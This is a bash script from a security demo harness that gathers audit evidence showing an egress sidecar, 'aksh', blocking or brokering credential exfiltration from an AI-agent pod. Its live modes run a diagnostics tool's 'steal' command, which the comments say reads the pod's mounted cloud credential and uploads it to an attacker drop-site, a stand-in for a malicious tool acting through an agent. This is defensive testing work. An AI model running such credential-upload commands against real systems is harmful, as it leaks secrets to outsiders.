#!/usr/bin/env bash
# cmd/evidence.sh — collect and print the sanitized evidence a talk needs: the
# aksh audit records for the last run, the resolved telemetry IP, arch/cgroup
# facts, and any evidence files validate has written. Never emits the model key.

cmd_evidence() {
  _e_list=1
  _e_livedeny=1
  _e_livesteal=1
  _e_livebroker=1
  _e_livebrokerinject=1
  for _e_a in "$@"; do
    case "$_e_a" in
      --list) _e_list=0 ;;
      --live-deny) _e_livedeny=0 ;;
      --live-steal) _e_livesteal=0 ;;
      --live-broker) _e_livebroker=0 ;;
      --live-broker-inject) _e_livebrokerinject=0 ;;
      -h|--help) _evidence_usage; return 0 ;;
    esac
  done
  load_presenter_env
  ensure_state_dirs

  if [ "$_e_livebrokerinject" -eq 0 ]; then
    _evidence_live_broker_inject
    return $?
  fi

  if [ "$_e_livebroker" -eq 0 ]; then
    _evidence_live_broker
    return $?
  fi

  if [ "$_e_livesteal" -eq 0 ]; then
    _evidence_live_steal
    return $?
  fi

  if [ "$_e_livedeny" -eq 0 ]; then
    _evidence_live_deny
    return $?
  fi

  if [ "$_e_list" -eq 0 ]; then
    step "evidence: files under ${EVIDENCE_DIR}"
    list_regular_files "$EVIDENCE_DIR" | while IFS= read -r _e_f; do
      [ -z "$_e_f" ] && continue
      info "$( basename "$_e_f" )"
    done
    return 0
  fi

  if ! cluster_exists; then
    warn "cluster '$CLUSTER' not up; showing only stored evidence files"
    _evidence_show_stored
    return 0
  fi

  step "evidence: environment facts"
  _ev_summary=$( evidence_write "environment.txt" <<EOF
timestamp=$( iso_utc )
host_arch=$( detect_host_arch )
docker_engine_arch=$( docker_engine_arch 2>/dev/null )
kind_node_arch=$( kind_node_arch 2>/dev/null )
node_kernel=$( node_kernel_release 2>/dev/null )
cgroup_topology=$( node_cgroup_topology 2>/dev/null )
telemetry_host=${TELEMETRY_HOST}
telemetry_resolves_to=$( resolve_in_cluster "$TELEMETRY_HOST" 2>/dev/null )
controller_bypass=$( controller_bypass_cidr 2>/dev/null )
EOF
)
  ok "wrote $( basename "$_ev_summary" )"
  sed 's/^/    /' "$_ev_summary"

  step "evidence: aksh audit records (sanitized)"
  _evidence_collect_audit

  step "evidence: stored artifacts"
  _evidence_show_stored
  return 0
}

# _evidence_collect_audit — pull the aksh sidecar's recent audit lines from the
# protected pod, scrub secrets, and store them.
_evidence_collect_audit() {
  _eca_pod=$( running_pod_name "$PROTECT_TARGET_SELECTOR" )
  if [ -z "$_eca_pod" ]; then
    warn "no protected pod found; run 'demo.sh protect' first"
    return 0
  fi
  _eca_logs=$( kcn logs "$_eca_pod" -c aksh --tail=500 2>/dev/null )
  if [ -z "$_eca_logs" ]; then
    warn "no aksh audit output from ${_eca_pod}"
    return 0
  fi
  _eca_file=$( printf '%s\n' "$_eca_logs" | evidence_write "audit.log" )
  ok "wrote $( basename "$_eca_file" ) ($( printf '%s\n' "$_eca_logs" | count_lines | tr -d ' ' ) lines, sanitized)"
  # Highlight the LOAD-BEARING records: denies for the exact diagnostic host and
  # path (not an arbitrary unfiltered tail, which could hide the point).
  _eca_deny=$( printf '%s\n' "$_eca_logs" \
    | grep -F '"path":"/api/v1/cluster-diagnostics"' \
    | grep -F '"disposition":"deny"' )
  if [ -n "$_eca_deny" ]; then
    ok "exfil deny records for ${TELEMETRY_HOST} ${DIAG_PATH}:"
    printf '%s\n' "$_eca_deny" | scrub_secrets | tail -5 | sed 's/^/    /'
  else
    warn "no deny record for ${DIAG_PATH} in the last 500 audit lines"
    warn "(is the pod protected and has the exfil flow been driven? see 'demo.sh validate --full')"
  fi
}

_evidence_show_stored() {
  _ess_n=$( list_regular_files "$EVIDENCE_DIR" | count_lines | tr -d ' ' )
  info "${_ess_n} evidence file(s) under ${EVIDENCE_DIR}"
}

_evidence_usage() {
  cat <<EOF
Usage: demo.sh evidence [--list | --live-deny | --live-steal]

  (no flag)     collect sanitized environment facts + aksh audit records and
                highlight the exfil deny for ${DIAG_PATH}.
  --list        list the stored evidence files only.
  --live-deny   MODEL-FREE offline contingency: drive the diagnostics exfil
                directly through the diagnostics-mcp 'send' CLI (no LLM / no
                OpenAI key) and prove aksh blocks it — collector count
                unchanged, tool output shows HTTP 403, and a NEW ${DIAG_PATH}
                policy_no_match audit record appears. Requires a PROTECTED
                cluster (run 'protect').
  --live-steal  MODEL-FREE credential-theft contingency: drive the
                diagnostics-mcp 'steal' CLI, which reads the pod's mounted
                cloud credential and tries to upload it. Proves aksh blocks the
                leak — no new leaked credential reaches the collector, the tool
                reports HTTP 403, and a NEW ${DIAG_PATH} policy_no_match audit
                record appears. Requires a PROTECTED cluster.
  --live-broker MODEL-FREE credential-broker (middle step) contingency: drive
                the diagnostics-mcp 'steal' CLI while the telemetry endpoint is
                ALLOWED but unbrokered. Proves the broker boundary — the request
                is ALLOWED and REACHES the collector (a new event), the tool
                reports HTTP 202, aksh audits the egress as ALLOW, yet the
                credential arrives EMPTY (stripped): no new real leak. Requires
                the BROKER cluster (run 'broker').
  --live-broker-inject MODEL-FREE positive-brokering contingency: drive the
                'steal' CLI while telemetry is ALLOWED and carries a credential
                provider. Proves Aksh INJECTS the brokered credential — the
                request is ALLOWED, the collector RECEIVES a valid credential
                (the Aksh-injected brokered token), yet the agent mounts only a
                placeholder. Requires the BROKER-INJECT cluster (run
                'broker-inject').
EOF
}

# live_deny_endpoint — the exact URL the diagnostics-mcp 'send' mode is pointed
# at (pure/derivable, so it is unit-testable).
live_deny_endpoint() {
  printf 'https://%s%s\n' "$TELEMETRY_HOST" "$DIAG_PATH"
}

# _evidence_live_deny — the model-free protected-deny trigger.
#
# The normal '--full' path drives a real kagent agent (and therefore spends
# OpenAI quota). When there is no network/quota on stage, this reproduces the
# load-bearing "aksh blocks the exfil" moment WITHOUT any model call: it invokes
# the diagnostics-mcp tool's `send <endpoint>` CLI mode directly inside the
# protected pod via `kubectl exec -c ${MCP_CONTAINER}`. aksh captures that
# egress exactly as it would the agent's, so the 403 + audit deny are real.
_evidence_live_deny() {
  if ! cluster_exists; then
    fail "cluster '$CLUSTER' is not up; run 'demo.sh setup' then 'demo.sh protect' first"
    report_failures
    return 1
  fi

  _eld_pod=$( running_pod_name "$PROTECT_TARGET_SELECTOR" )
  if [ -z "$_eld_pod" ]; then
    fail "no Running agent pod for '${PROTECT_TARGET_SELECTOR}'"
    report_failures
    return 1
  fi
  # Must be PROTECTED (aksh sidecar present) or there is nothing to block it.
  if ! kcn get pod "$_eld_pod" -o jsonpath='{range .spec.containers[*]}{.name}{"\n"}{end}' 2>/dev/null | grep -qx aksh; then
    fail "pod ${_eld_pod} has no aksh sidecar; run 'demo.sh protect' before --live-deny"
    report_failures
    return 1
  fi
  # The diagnostics-mcp container must be present to drive the tool CLI.
  if ! kcn get pod "$_eld_pod" -o jsonpath='{range .spec.containers[*]}{.name}{"\n"}{end}' 2>/dev/null | grep -qx "$MCP_CONTAINER"; then
    fail "pod ${_eld_pod} has no '${MCP_CONTAINER}' container (set MCP_CONTAINER to match the Agent manifest)"
    report_failures
    return 1
  fi
  info "protected pod: ${_eld_pod}"

  _eld_ep=$( live_deny_endpoint )
  _eld_run=$( uniq_id "livedeny" )
  step "live-deny: driving diagnostics-mcp 'send' directly (model-free)"
  info "endpoint: ${_eld_ep}"

  # Baselines BEFORE the trigger.
  _eld_count_before=$( collector_observer_count )
  _eld_deny_before=$( kcn logs "$_eld_pod" -c aksh --tail=1500 2>/dev/null \
    | grep -F "\"path\":\"${DIAG_PATH}\"" | grep -c '"reason":"policy_no_match"' || true )
  [ -n "$_eld_deny_before" ] || _eld_deny_before=0

  # The trigger itself — NO model call. Runs the tool CLI inside the pod.
  _eld_out=$( kcn exec "$_eld_pod" -c "$MCP_CONTAINER" -- \
    "$MCP_SEND_BINARY" send "$_eld_ep" 2>&1 )
  _eld_rc=$?
  info "diagnostics-mcp send exit=${_eld_rc}"
  if [ "$_eld_rc" -ne 0 ]; then
    fail "live-deny: diagnostics-mcp send command failed (exit ${_eld_rc})"
  fi

  sleep 3
  _eld_count_after=$( collector_observer_count )
  _eld_deny_after=$( kcn logs "$_eld_pod" -c aksh --tail=1500 2>/dev/null \
    | grep -F "\"path\":\"${DIAG_PATH}\"" | grep -c '"reason":"policy_no_match"' || true )
  [ -n "$_eld_deny_after" ] || _eld_deny_after=0

  # Assertion 1: the tool surfaced HTTP 403 (aksh's uniform deny).
  case "$_eld_out" in
    *"HTTP 403"*|*"403 Forbidden"*|*'"status":403'*) ok "live-deny: diagnostics-mcp reported HTTP 403 (blocked)" ;;
    *) fail "live-deny: diagnostics-mcp output did not contain HTTP 403 (was it captured by aksh?)" ;;
  esac

  # Assertion 2: the collector never received the beacon (count unchanged).
  if [ -n "$_eld_count_before" ] && [ -n "$_eld_count_after" ]; then
    if [ "$_eld_count_after" -eq "$_eld_count_before" ] 2>/dev/null; then
      ok "live-deny: collector count UNCHANGED at ${_eld_count_after} (exfil blocked)"
    else
      fail "live-deny: collector count changed ${_eld_count_before} -> ${_eld_count_after}; exfil was NOT blocked"
    fi
  else
    fail "live-deny: collector count endpoint unavailable; cannot confirm the beacon was blocked"
  fi

  # Assertion 3: a NEW exact-path policy_no_match audit record appeared.
  if [ "$_eld_deny_after" -gt "$_eld_deny_before" ] 2>/dev/null; then
    ok "live-deny: new ${DIAG_PATH} policy_no_match audit record (${_eld_deny_before} -> ${_eld_deny_after})"
  else
    fail "live-deny: no NEW ${DIAG_PATH} policy_no_match audit record (${_eld_deny_before} -> ${_eld_deny_after})"
  fi

  # Persist sanitized structured evidence.
  _eld_ev="${EVIDENCE_DIR}/${_eld_run}-live-deny.json"
  evidence_json_begin "$_eld_ev"
  evidence_json_field "$_eld_ev" "run_id" "$_eld_run"
  evidence_json_field "$_eld_ev" "timestamp" "$( iso_utc )"
  evidence_json_field "$_eld_ev" "mode" "model-free (diagnostics-mcp send)"
  evidence_json_field "$_eld_ev" "endpoint" "$_eld_ep"
  evidence_json_field "$_eld_ev" "pod" "$_eld_pod"
  evidence_json_field "$_eld_ev" "collector_count_before" "${_eld_count_before:-unknown}"
  evidence_json_field "$_eld_ev" "collector_count_after" "${_eld_count_after:-unknown}"
  evidence_json_field "$_eld_ev" "deny_records_before" "$_eld_deny_before"
  evidence_json_field "$_eld_ev" "deny_records_after" "$_eld_deny_after"
  evidence_json_field "$_eld_ev" "tool_output" "$( printf '%s' "$_eld_out" | scrub_secrets | tr '\n' ' ' )"
  _eld_denyline=$( kcn logs "$_eld_pod" -c aksh --tail=1500 2>/dev/null \
    | grep -F "\"path\":\"${DIAG_PATH}\"" | grep -F '"reason":"policy_no_match"' | tail -1 )
  [ -n "$_eld_denyline" ] && evidence_json_field "$_eld_ev" "deny_audit" "$( printf '%s' "$_eld_denyline" | scrub_secrets )"
  evidence_json_field "$_eld_ev" "fail_count" "$FAIL_COUNT"
  evidence_json_end "$_eld_ev"
  ok "structured evidence: $( basename "$_eld_ev" )"

  report_failures
}

# live_steal_endpoint — same bounded collector endpoint the credential tool
# uploads to (derivable, unit-testable).
live_steal_endpoint() { printf 'https://%s%s\n' "$TELEMETRY_HOST" "$DIAG_PATH"; }

# _evidence_live_steal — MODEL-FREE credential-theft contingency.
#
# Reproduces the load-bearing "aksh stops the credential leak" moment WITHOUT
# any LLM/model call: it drives the diagnostics-mcp 'steal' CLI inside the
# protected pod, which reads the pod's mounted cloud credential and tries to
# upload it to the attacker drop-site. aksh captures that egress exactly as it
# would the agent's, so the 403 and audit deny are real, and the collector
# never receives a new leaked credential.
_evidence_live_steal() {
  if ! cluster_exists; then
    fail "cluster '$CLUSTER' is not up; run 'demo.sh setup' then 'demo.sh protect' first"
    report_failures; return 1
  fi
  _els_pod=$( running_pod_name "$PROTECT_TARGET_SELECTOR" )
  if [ -z "$_els_pod" ]; then
    fail "no Running agent pod for '${PROTECT_TARGET_SELECTOR}'"; report_failures; return 1
  fi
  if ! kcn get pod "$_els_pod" -o jsonpath='{range .spec.containers[*]}{.name}{"\n"}{end}' 2>/dev/null | grep -qx aksh; then
    fail "pod ${_els_pod} has no aksh sidecar; run 'demo.sh protect' before --live-steal"; report_failures; return 1
  fi
  if ! kcn get pod "$_els_pod" -o jsonpath='{range .spec.containers[*]}{.name}{"\n"}{end}' 2>/dev/null | grep -qx "$MCP_CONTAINER"; then
    fail "pod ${_els_pod} has no '${MCP_CONTAINER}' container"; report_failures; return 1
  fi
  info "protected pod: ${_els_pod}"

  _els_ep=$( live_steal_endpoint )
  _els_run=$( uniq_id "livesteal" )
  step "live-steal: driving diagnostics-mcp 'steal' directly (model-free credential exfil)"
  info "endpoint: ${_els_ep}"

  _els_leak_before=$( collector_leak_count )
  _els_deny_before=$( kcn logs "$_els_pod" -c aksh --tail=1500 2>/dev/null \
    | grep -F "\"path\":\"${DIAG_PATH}\"" | grep -c '"reason":"policy_no_match"' || true )
  [ -n "$_els_deny_before" ] || _els_deny_before=0

  _els_out=$( kcn exec "$_els_pod" -c "$MCP_CONTAINER" -- \
    "$MCP_STEAL_BINARY" steal "$_els_ep" 2>&1 )
  _els_rc=$?
  info "diagnostics-mcp steal exit=${_els_rc}"

  sleep 3
  _els_leak_after=$( collector_leak_count )
  _els_deny_after=$( kcn logs "$_els_pod" -c aksh --tail=1500 2>/dev/null \
    | grep -F "\"path\":\"${DIAG_PATH}\"" | grep -c '"reason":"policy_no_match"' || true )
  [ -n "$_els_deny_after" ] || _els_deny_after=0

  case "$_els_out" in
    *"HTTP 403"*|*"403 Forbidden"*|*'"status":403'*) ok "live-steal: credential upload reported HTTP 403 (blocked)" ;;
    *) fail "live-steal: tool output did not contain HTTP 403 (was it captured by aksh?)" ;;
  esac
  if [ -n "$_els_leak_before" ] && [ -n "$_els_leak_after" ]; then
    if [ "$_els_leak_after" -eq "$_els_leak_before" ] 2>/dev/null; then
      ok "live-steal: collector received NO new leaked credential (count ${_els_leak_after})"
    else
      fail "live-steal: collector leak count changed ${_els_leak_before} -> ${_els_leak_after}; credential was NOT blocked"
    fi
  else
    fail "live-steal: collector observer unavailable; cannot confirm non-receipt"
  fi
  if [ "$_els_deny_after" -gt "$_els_deny_before" ] 2>/dev/null; then
    ok "live-steal: new ${DIAG_PATH} policy_no_match audit record (${_els_deny_before} -> ${_els_deny_after})"
  else
    fail "live-steal: no NEW ${DIAG_PATH} policy_no_match audit record"
  fi

  _els_ev="${EVIDENCE_DIR}/${_els_run}-live-steal.json"
  evidence_json_begin "$_els_ev"
  evidence_json_field "$_els_ev" "run_id" "$_els_run"
  evidence_json_field "$_els_ev" "timestamp" "$( iso_utc )"
  evidence_json_field "$_els_ev" "mode" "model-free credential theft (diagnostics-mcp steal)"
  evidence_json_field "$_els_ev" "endpoint" "$_els_ep"
  evidence_json_field "$_els_ev" "pod" "$_els_pod"
  evidence_json_field "$_els_ev" "collector_leaks_before" "${_els_leak_before:-unknown}"
  evidence_json_field "$_els_ev" "collector_leaks_after" "${_els_leak_after:-unknown}"
  evidence_json_field "$_els_ev" "deny_records_before" "$_els_deny_before"
  evidence_json_field "$_els_ev" "deny_records_after" "$_els_deny_after"
  evidence_json_field "$_els_ev" "tool_output" "$( printf '%s' "$_els_out" | scrub_secrets | tr '\n' ' ' )"
  evidence_json_field "$_els_ev" "fail_count" "$FAIL_COUNT"
  evidence_json_end "$_els_ev"
  ok "structured evidence: $( basename "$_els_ev" )"
  report_failures
}

# _evidence_live_broker — MODEL-FREE credential-broker (middle step) contingency.
#
# Requires the cluster to be in the BROKER state ('demo.sh broker'): aksh
# installed with the telemetry endpoint ALLOWED but no credential provider, and
# NO custody (the agent still holds the real token). It drives the diagnostics-
# mcp 'steal' CLI, which sends the real credential in the Authorization header.
# The expected outcome is the demo's headline broker moment: the request is
# ALLOWED and REACHES the collector (a new event), but aksh strips the
# Authorization so the collector receives an EMPTY credential — no new real leak.
_evidence_live_broker() {
  if ! cluster_exists; then
    fail "cluster '$CLUSTER' is not up; run 'demo.sh setup' then 'demo.sh broker' first"
    report_failures; return 1
  fi
  _elb_pod=$( running_pod_name "$PROTECT_TARGET_SELECTOR" )
  if [ -z "$_elb_pod" ]; then
    fail "no Running agent pod for '${PROTECT_TARGET_SELECTOR}'"; report_failures; return 1
  fi
  if ! kcn get pod "$_elb_pod" -o jsonpath='{range .spec.containers[*]}{.name}{"\n"}{end}' 2>/dev/null | grep -qx aksh; then
    fail "pod ${_elb_pod} has no aksh sidecar; run 'demo.sh broker' before --live-broker"; report_failures; return 1
  fi
  if ! kcn get pod "$_elb_pod" -o jsonpath='{range .spec.containers[*]}{.name}{"\n"}{end}' 2>/dev/null | grep -qx "$MCP_CONTAINER"; then
    fail "pod ${_elb_pod} has no '${MCP_CONTAINER}' container"; report_failures; return 1
  fi
  info "broker pod: ${_elb_pod}"

  _elb_ep=$( live_steal_endpoint )
  _elb_run=$( uniq_id "livebroker" )
  step "live-broker: driving diagnostics-mcp 'steal' directly (model-free; telemetry ALLOWED, credential brokered)"
  info "endpoint: ${_elb_ep}"

  _elb_events_before=$( collector_event_count )
  _elb_leak_before=$( collector_leak_count )
  _elb_allow_before=$( kcn logs "$_elb_pod" -c aksh --tail=1500 2>/dev/null \
    | grep -F "\"path\":\"${DIAG_PATH}\"" | grep -c '"disposition":"allow"' || true )
  [ -n "$_elb_allow_before" ] || _elb_allow_before=0

  _elb_out=$( kcn exec "$_elb_pod" -c "$MCP_CONTAINER" -- \
    "$MCP_STEAL_BINARY" steal "$_elb_ep" 2>&1 )
  info "diagnostics-mcp steal exit=$?"

  sleep 3
  _elb_events_after=$( collector_event_count )
  _elb_leak_after=$( collector_leak_count )
  _elb_allow_after=$( kcn logs "$_elb_pod" -c aksh --tail=1500 2>/dev/null \
    | grep -F "\"path\":\"${DIAG_PATH}\"" | grep -c '"disposition":"allow"' || true )
  [ -n "$_elb_allow_after" ] || _elb_allow_after=0

  # 1) The exfil was ALLOWED (not blocked) — the request reached the collector.
  case "$_elb_out" in
    *"HTTP 202"*|*"succeeded"*) ok "live-broker: telemetry upload was ALLOWED (HTTP 202) — egress permitted" ;;
    *"HTTP 403"*|*"403 Forbidden"*) fail "live-broker: upload was DENIED (403); expected the broker policy to ALLOW telemetry" ;;
    *) fail "live-broker: unexpected tool output (expected HTTP 202 allowed): ${_elb_out}" ;;
  esac
  # 2) The collector RECEIVED the request (total events increased by one).
  if [ -n "$_elb_events_before" ] && [ -n "$_elb_events_after" ] \
     && [ "$_elb_events_after" -gt "$_elb_events_before" ] 2>/dev/null; then
    ok "live-broker: collector RECEIVED the request (events ${_elb_events_before} -> ${_elb_events_after})"
  else
    fail "live-broker: collector did not record a new request (events ${_elb_events_before:-?} -> ${_elb_events_after:-?})"
  fi
  # 3) But the credential arrived EMPTY — no new real leak (stolen_credential).
  if [ -n "$_elb_leak_before" ] && [ -n "$_elb_leak_after" ]; then
    if [ "$_elb_leak_after" -eq "$_elb_leak_before" ] 2>/dev/null; then
      ok "live-broker: credential was STRIPPED — collector received NO credential (leak count ${_elb_leak_after})"
    else
      fail "live-broker: collector recorded a credential (${_elb_leak_before} -> ${_elb_leak_after}); the strip did NOT happen"
    fi
  else
    fail "live-broker: collector observer unavailable; cannot confirm the strip"
  fi
  # 4) aksh audited the telemetry egress as ALLOW (not deny).
  if [ "$_elb_allow_after" -gt "$_elb_allow_before" ] 2>/dev/null; then
    ok "live-broker: aksh audited the telemetry egress as ALLOW (${_elb_allow_before} -> ${_elb_allow_after})"
  else
    fail "live-broker: no NEW ${DIAG_PATH} allow audit record"
  fi

  _elb_ev="${EVIDENCE_DIR}/${_elb_run}-live-broker.json"
  evidence_json_begin "$_elb_ev"
  evidence_json_field "$_elb_ev" "run_id" "$_elb_run"
  evidence_json_field "$_elb_ev" "timestamp" "$( iso_utc )"
  evidence_json_field "$_elb_ev" "mode" "model-free credential broker (telemetry allowed, Authorization stripped)"
  evidence_json_field "$_elb_ev" "endpoint" "$_elb_ep"
  evidence_json_field "$_elb_ev" "pod" "$_elb_pod"
  evidence_json_field "$_elb_ev" "events_before" "${_elb_events_before:-unknown}"
  evidence_json_field "$_elb_ev" "events_after" "${_elb_events_after:-unknown}"
  evidence_json_field "$_elb_ev" "collector_leaks_before" "${_elb_leak_before:-unknown}"
  evidence_json_field "$_elb_ev" "collector_leaks_after" "${_elb_leak_after:-unknown}"
  evidence_json_field "$_elb_ev" "allow_records_before" "$_elb_allow_before"
  evidence_json_field "$_elb_ev" "allow_records_after" "$_elb_allow_after"
  evidence_json_field "$_elb_ev" "tool_output" "$( printf '%s' "$_elb_out" | scrub_secrets | tr '\n' ' ' )"
  evidence_json_field "$_elb_ev" "fail_count" "$FAIL_COUNT"
  evidence_json_end "$_elb_ev"
  ok "structured evidence: $( basename "$_elb_ev" )"
  report_failures
}

# _evidence_live_broker_inject — MODEL-FREE positive-brokering contingency.
#
# Requires the BROKER-INJECT state ('demo.sh broker-inject'): aksh installed
# with the telemetry endpoint ALLOWED and carrying a credential provider, and
# custody applied so the agent mounts only a placeholder. It drives the
# diagnostics-mcp 'steal' CLI; aksh strips the agent's (placeholder) credential
# and INJECTS the brokered credential it holds. Expected outcome: the request is
# ALLOWED and REACHES the collector, and the collector receives a NON-EMPTY,
# valid credential — the Aksh-injected brokered token, which the agent never
# held (its mount is the placeholder).
_evidence_live_broker_inject() {
  if ! cluster_exists; then
    fail "cluster '$CLUSTER' is not up; run 'demo.sh setup' then 'demo.sh broker-inject' first"
    report_failures; return 1
  fi
  _ebi_pod=$( running_pod_name "$PROTECT_TARGET_SELECTOR" )
  if [ -z "$_ebi_pod" ]; then
    fail "no Running agent pod for '${PROTECT_TARGET_SELECTOR}'"; report_failures; return 1
  fi
  if ! kcn get pod "$_ebi_pod" -o jsonpath='{range .spec.containers[*]}{.name}{"\n"}{end}' 2>/dev/null | grep -qx aksh; then
    fail "pod ${_ebi_pod} has no aksh sidecar; run 'demo.sh broker-inject' first"; report_failures; return 1
  fi
  if ! kcn get pod "$_ebi_pod" -o jsonpath='{range .spec.containers[*]}{.name}{"\n"}{end}' 2>/dev/null | grep -qx "$MCP_CONTAINER"; then
    fail "pod ${_ebi_pod} has no '${MCP_CONTAINER}' container"; report_failures; return 1
  fi
  info "broker-inject pod: ${_ebi_pod}"

  # Confirm the agent really holds only a placeholder, so a valid credential at
  # the collector can only be the Aksh-injected brokered one.
  _ebi_kind=$( kcn exec "$_ebi_pod" -c "$MCP_CONTAINER" -- "$MCP_STEAL_BINARY" credcheck 2>/dev/null | tr -d '\r\n' )
  case "$_ebi_kind" in
    placeholder) ok "broker-inject: the agent mounts only a placeholder (holds no active credential)" ;;
    *) fail "broker-inject: expected the agent to mount a placeholder, got '${_ebi_kind}'" ;;
  esac

  _ebi_ep=$( live_steal_endpoint )
  _ebi_run=$( uniq_id "livebrokerinject" )
  step "live-broker-inject: driving diagnostics-mcp 'steal' (model-free; telemetry ALLOWED + credential brokered)"
  info "endpoint: ${_ebi_ep}"

  _ebi_events_before=$( collector_event_count )
  _ebi_leak_before=$( collector_leak_count )
  _ebi_allow_before=$( kcn logs "$_ebi_pod" -c aksh --tail=1500 2>/dev/null \
    | grep -F "\"path\":\"${DIAG_PATH}\"" | grep -c '"disposition":"allow"' || true )
  [ -n "$_ebi_allow_before" ] || _ebi_allow_before=0

  _ebi_out=$( kcn exec "$_ebi_pod" -c "$MCP_CONTAINER" -- \
    "$MCP_STEAL_BINARY" steal "$_ebi_ep" 2>&1 )
  info "diagnostics-mcp steal exit=$?"

  sleep 3
  _ebi_events_after=$( collector_event_count )
  _ebi_leak_after=$( collector_leak_count )
  _ebi_allow_after=$( kcn logs "$_ebi_pod" -c aksh --tail=1500 2>/dev/null \
    | grep -F "\"path\":\"${DIAG_PATH}\"" | grep -c '"disposition":"allow"' || true )
  [ -n "$_ebi_allow_after" ] || _ebi_allow_after=0

  # 1) Allowed (HTTP 202) — the request reached the collector.
  case "$_ebi_out" in
    *"HTTP 202"*|*"succeeded"*) ok "broker-inject: telemetry upload was ALLOWED (HTTP 202)" ;;
    *"HTTP 403"*|*"403 Forbidden"*) fail "broker-inject: upload was DENIED (403); expected ALLOW" ;;
    *) fail "broker-inject: unexpected tool output: ${_ebi_out}" ;;
  esac
  # 2) The collector RECEIVED the request.
  if [ -n "$_ebi_events_before" ] && [ -n "$_ebi_events_after" ] \
     && [ "$_ebi_events_after" -gt "$_ebi_events_before" ] 2>/dev/null; then
    ok "broker-inject: collector RECEIVED the request (events ${_ebi_events_before} -> ${_ebi_events_after})"
  else
    fail "broker-inject: collector did not record a new request (events ${_ebi_events_before:-?} -> ${_ebi_events_after:-?})"
  fi
  # 3) The collector received a NON-EMPTY credential — the Aksh-INJECTED brokered
  #    token, which the agent (placeholder) never held.
  if [ -n "$_ebi_leak_before" ] && [ -n "$_ebi_leak_after" ] \
     && [ "$_ebi_leak_after" -gt "$_ebi_leak_before" ] 2>/dev/null; then
    ok "broker-inject: collector received the Aksh-INJECTED brokered credential (leak ${_ebi_leak_before} -> ${_ebi_leak_after}); the agent held only a placeholder"
  else
    fail "broker-inject: collector received NO credential (leak ${_ebi_leak_before:-?} -> ${_ebi_leak_after:-?}); brokered injection did NOT happen"
  fi
  # 4) aksh audited the telemetry egress as ALLOW.
  if [ "$_ebi_allow_after" -gt "$_ebi_allow_before" ] 2>/dev/null; then
    ok "broker-inject: aksh audited the telemetry egress as ALLOW (${_ebi_allow_before} -> ${_ebi_allow_after})"
  else
    fail "broker-inject: no NEW ${DIAG_PATH} allow audit record"
  fi

  _ebi_ev="${EVIDENCE_DIR}/${_ebi_run}-live-broker-inject.json"
  evidence_json_begin "$_ebi_ev"
  evidence_json_field "$_ebi_ev" "run_id" "$_ebi_run"
  evidence_json_field "$_ebi_ev" "timestamp" "$( iso_utc )"
  evidence_json_field "$_ebi_ev" "mode" "model-free positive brokering (telemetry allowed, credential injected)"
  evidence_json_field "$_ebi_ev" "endpoint" "$_ebi_ep"
  evidence_json_field "$_ebi_ev" "pod" "$_ebi_pod"
  evidence_json_field "$_ebi_ev" "agent_mount_kind" "$_ebi_kind"
  evidence_json_field "$_ebi_ev" "events_before" "${_ebi_events_before:-unknown}"
  evidence_json_field "$_ebi_ev" "events_after" "${_ebi_events_after:-unknown}"
  evidence_json_field "$_ebi_ev" "collector_leaks_before" "${_ebi_leak_before:-unknown}"
  evidence_json_field "$_ebi_ev" "collector_leaks_after" "${_ebi_leak_after:-unknown}"
  evidence_json_field "$_ebi_ev" "allow_records_before" "$_ebi_allow_before"
  evidence_json_field "$_ebi_ev" "allow_records_after" "$_ebi_allow_after"
  evidence_json_field "$_ebi_ev" "tool_output" "$( printf '%s' "$_ebi_out" | scrub_secrets | tr '\n' ' ' )"
  evidence_json_field "$_ebi_ev" "fail_count" "$FAIL_COUNT"
  evidence_json_end "$_ebi_ev"
  ok "structured evidence: $( basename "$_ebi_ev" )"
  report_failures
}
